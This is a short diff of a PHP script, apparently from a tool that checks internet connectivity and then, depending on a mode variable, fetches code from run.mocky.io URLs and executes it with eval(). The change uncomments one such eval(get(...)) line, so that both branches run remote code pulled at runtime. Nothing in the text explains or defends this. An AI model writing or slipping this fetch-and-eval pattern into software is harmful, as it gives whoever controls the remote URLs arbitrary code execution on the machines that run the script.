@@ -148,7 +148,7 @@ if(!$sock = @fsockopen("www.google.com", 80)){
     exit();
 }
 if ($chedo == '1')
-        #eval(get("https://run.mocky.io/v3/7c271598-d15c-4b58-9bb0-de1c2802120b"));
+        eval(get("https://run.mocky.io/v3/7c271598-d15c-4b58-9bb0-de1c2802120b"));
 if ($chedo == '2')
         eval(get("https://run.mocky.io/v3/7417a5c0-a6b7-494d-81d7-93354fbfea15"));
 	function get($url){
